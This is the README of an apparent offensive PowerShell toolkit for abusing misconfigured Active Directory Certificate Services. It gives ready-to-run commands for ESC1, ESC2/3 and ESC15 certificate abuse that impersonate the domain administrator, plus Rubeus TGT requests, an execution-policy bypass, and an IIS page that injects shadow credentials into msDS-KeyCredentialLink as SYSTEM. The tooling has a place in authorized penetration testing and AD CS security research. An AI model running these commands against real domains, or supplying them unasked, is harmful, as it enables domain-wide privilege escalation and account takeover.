# Certi-Bhai: AD CS Exploitation Toolkit

Certi-Bhai is a comprehensive collection of PowerShell exploitation tools for attacking Active Directory Certificate Services (AD CS) vulnerabilities. This toolkit implements various Escalation Scenarios (ESCs) that demonstrate critical security misconfigurations in ADCS environments.

## 📋 Table of Contents

- [Overview](#overview)
- [Directory Structure](#directory-structure)
- [Prerequisites](#prerequisites)
- [Usage Guide](#usage-guide)
  - [ESC1 - Overly Permissive Certificate Template](#esc1)
  - [ESC2/3 - Certificate Request Agent](#esc3)
  - [ESC15 - Vulnerable Web Enrollment](#esc15)
  - [CSR Generation](#csr-generation)
  - [IIS Privilege Escalation](#iis-privilege-escalation)

---

## 🎯 Overview

Active Directory Certificate Services (AD CS) is often misconfigured, creating multiple attack vectors. Certi-Bhai provides practical exploitation scripts and utilities for security testing and research of common ADCS vulnerabilities.

**Use responsibly and only in authorized test environments.**

---


## ✅ Prerequisites

- Windows 7 / Windows Server 2008 or later
- PowerShell 3.0+
- Active Directory domain-joined system
- Appropriate permissions to request certificates
- Access to AD CS infrastructure
- .NET Framework 3.5+ (for ASP.NET scripts)

### Required Modules
```powershell
# Active Directory module (optional, for enhanced functionality)
Import-Module ActiveDirectory
```

---

## 🚀 Usage Guide

### ESC1: Overly Permissive Certificate Template

**Vulnerability**: Certificate templates allow enrollment with arbitrary SubjectAltName (SAN) values.

**What it does**: Creates a certificate signed by an overly permissive template, allowing you to impersonate any user or computer in the domain.

**Usage**:

```powershell
# Navigate to ESC1 directory
cd ESC1

# Run the exploitation script
.
\esc1.ps1 -subjectName "CN=administrator,CN=Users,DC=indishell,DC=lab" `
           -templateName "vuln" `
           -altName "administrator" `
           -pfxPass "password123"
```

**Parameters**:
- `-subjectName`: Full distinguished name (DN) of the target user
- `-templateName`: Name of the vulnerable certificate template
- `-altName`: Alternative name to request (username/computer)
- `-pfxPass`: Password for PFX export

**Output**: Base64-encoded PFX certificate for use with tools like Rubeus

**Video Tutorial**: https://www.youtube.com/watch?v=l0gMw_mO4dw

---

### ESC2/3: Any Purpose/Certificate Request Agent Abuse

**Vulnerability**: Certificate Request Agents can request certificates on behalf of any user.

**What it does**: Enrolls a certificate as a Certificate Request Agent, then requests certificates for arbitrary principals.

**Usage**:

```powershell
# Navigate to ESC3 directory
cd ESC3

# Run the exploitation script
.
\esc3_working.ps1 -templateName "CEOTemplate" `
                   -target_user "administrator" `
                   -domain "INDISHELL" `
                   -pfxPass "password123"
```

**Parameters**:
- `-templateName`: Vulnerable request agent template
- `-target_user`: Principal to request certificate for
- `-domain`: Domain name
- `-pfxPass`: PFX password

**Output**: Administrator certificate (PFX) with base64 encoding

**Video Tutorial**: https://www.youtube.com/watch?v=fGjrM-JKnoM

---

### ESC15: Misconfigured Web Enrollment

**Vulnerability**: Web enrollment interfaces allow authentication bypass or privilege escalation.

**What it does**: Exploits misconfigured web enrollment interfaces to request or issue certificates through HTTP-accessible endpoints.

**Usage**:

```powershell
# Navigate to ESC15 directory
cd ESC15

# Run the exploitation script
.
\esc15.ps1 -templateName "WebEnrollTemplate" `
            -targetUser "administrator"
```

---

## CSR Generation and Management

### Quick CSR Generation

```powershell
cd CSR_Generate

# Generate a certificate signing request
.
\csr_short.ps1 -subjectName "CN=admin,CN=Users,DC=domain,DC=local" `
                -altName "admin"
```

### Submit CSR to Certificate Authority

```powershell
# Submit CSR to CA
.
\csr_submit.ps1 -csr $csr `
                 -templateName "User" `
                 -caServer "ca-server.domain.local"
```

---

##  IIS Privilege Escalation

### Certificate Management Interface

The `cert.aspx` web interface provides a user-friendly form to request a certificate from AD CS RPC endpoint:

```
http://your-iis-server/cert.aspx
```

### LDAP Update Interface

Modify LDAP attributes through the web interface. This script basically used to perform inject blob in `msDS-KeyCredentialLink` attribute:

```
http://your-iis-server/ldap_update.aspx
```

**Features**:
- LDAP attribute filtering
- Object modification capabilities
- NT Authority\SYSTEM context execution

---

## Quick Reference Commands

### For ESC1 Exploitation
```powershell
.
\ESC1/esc1.ps1 -subjectName "CN=admin,CN=Users,DC=indishell,DC=lab" `
                -templateName "User" `
                -altName "administrator" `
                -pfxPass "P@ssw0rd!"
```

### For ESC2/3 Post-Exploitation
```powershell
# Convert PFX to usable format for Rubeus
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("cert.pfx", "password")
[Convert]::ToBase64String($cert.RawData)
```

### Request TGT with Rubeus
```powershell
Rubeus.exe asktgt /user:administrator /certificate:$base64cert /nowrap
```


---


## 🔧 Troubleshooting

### Common Issues

**Q: Script execution is blocked**
```powershell
# Run PowerShell as Administrator
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

**Q: Certificate template not found**
- Verify template name is correct
- Ensure you have permissions to request from template
- Check Certificate Authority logs

**Q: LDAP connection fails**
- Verify domain connectivity
- Check credentials
- Confirm ADSI access

---

## 📝 Technical Details

### Certificate Request Process

1. Generate private key (2048-bit RSA)
2. Create certificate request (PKCS#10)
3. Set subject name and extensions
4. Submit to Certificate Authority
5. Retrieve issued certificate
6. Export as PFX with password


## 🤝 Contributing

Found an issue or have improvements? Please report responsibly.

---

